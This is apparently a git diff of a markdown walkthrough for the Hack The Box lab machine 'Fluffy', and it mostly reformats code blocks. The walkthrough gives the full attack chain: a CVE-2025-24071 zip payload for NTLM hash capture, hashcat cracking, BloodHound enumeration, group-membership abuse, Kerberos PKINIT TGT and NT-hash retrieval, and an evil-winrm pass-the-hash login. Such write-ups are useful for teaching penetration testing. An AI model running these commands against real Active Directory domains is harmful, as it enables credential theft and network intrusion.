@@ -49,21 +49,20 @@ You should find https://github.com/LOOKY243/CVE-2025-24071-PoC
 
 ### Steps
 1. Copy the exploit.py file to your machine 
-2. python3 ```exploit.py -i 10.10.16.40 -s shared -f evil```
+2. python3 `exploit.py -i 10.10.16.40 -s shared -f evil`
  3. Start listener for hash capture:
-   ```sudo impacket-smbserver shared /home/franky/Documents/FLUFFY -smb2support```
+   `sudo impacket-smbserver shared /home/franky/Documents/FLUFFY -smb2support`
    3. Upload payload to target IT share.
-      ``put evil.zip``
+      `put evil.zip`
 
 4. You should se username + hash on listner.
 
 5. Crack the with rockyou.txt: 
-  ``` hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt``
+  `hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt`
 
 6. Now we have a new username and password. You might try evil-winrm, but the user does not have permission. So, let's enumerate more. Create a BloodHound file and upload to bloodhound review.
-      ```
-        sudo nxc ldap dc01.fluffy.htb -u '<USERNAME>' -p '<PASSWORD>' \
-      --bloodhound --collection All --dns-tcp --dns-server <TARGET_IP> ```
+      `sudo nxc ldap dc01.fluffy.htb -u '<USERNAME>' -p '<PASSWORD>' \
+      --bloodhound --collection All --dns-tcp --dns-server <TARGET_IP>`
 
 
 Observations
@@ -84,38 +83,38 @@ Implications: User can indirectly modify service accounts. Compromising this use
 
 ### Add User to Service Accounts
 
-```net rpc group addmem "Service Accounts" "<USER>" \
-  -U "dc01.fluffy.htb"/"<USER>" -S "<TARGET_IP>"```
+`net rpc group addmem "Service Accounts" "<USER>" \
+  -U "dc01.fluffy.htb"/"<USER>" -S "<TARGET_IP>"`
 
 
-###Request Kerberos TGT for Service Account
+### Request Kerberos TGT for Service Account
 
 If your local time does not match the Domain Controller (DC), you may encounter errors. Synchronize time first:
 
-sudo rdate -n <TARGET_IP>
+`sudo rdate -n <TARGET_IP>`
 
 
-###Generate a TGT using faketime:
-```faketime '<DATE_TIME>' python3 gettgtpkinit.py \
+### Generate a TGT using faketime:
+`faketime '<DATE_TIME>' python3 gettgtpkinit.py \
   -cert-pem key_cert.pem \
   -key-pem key_priv.pem \
   fluffy.htb/<SERVICE_ACCOUNT> \
-  <SERVICE_ACCOUNT>.ccache```
+  <SERVICE_ACCOUNT>.ccache`
 
 
-###Set the Kerberos ticket environment variable:
+### Set the Kerberos ticket environment variable:
 
-```export KRB5CCNAME=<SERVICE_ACCOUNT>.ccache```
+`export KRB5CCNAME=<SERVICE_ACCOUNT>.ccache`
 
 
 Tip: Ensure the KRB5CCNAME export works in your virtual environment. Use an absolute path if necessary.
 
-###Retrieve NT Hash
-```faketime '<DATE_TIME>' python3 getnthash.py \
-  -key <KEY> fluffy.htb/<SERVICE_ACCOUNT>```
+### Retrieve NT Hash
+'faketime '<DATE_TIME>' python3 getnthash.py \
+  -key <KEY> fluffy.htb/<SERVICE_ACCOUNT>''
 
-###Access Service Account
-```evil-winrm -i <TARGET_IP> -u <SERVICE_ACCOUNT> -H <NT_HASH>```
+### Access Service Account
+`evil-winrm -i <TARGET_IP> -u <SERVICE_ACCOUNT> -H <NT_HASH>`
 
 
 
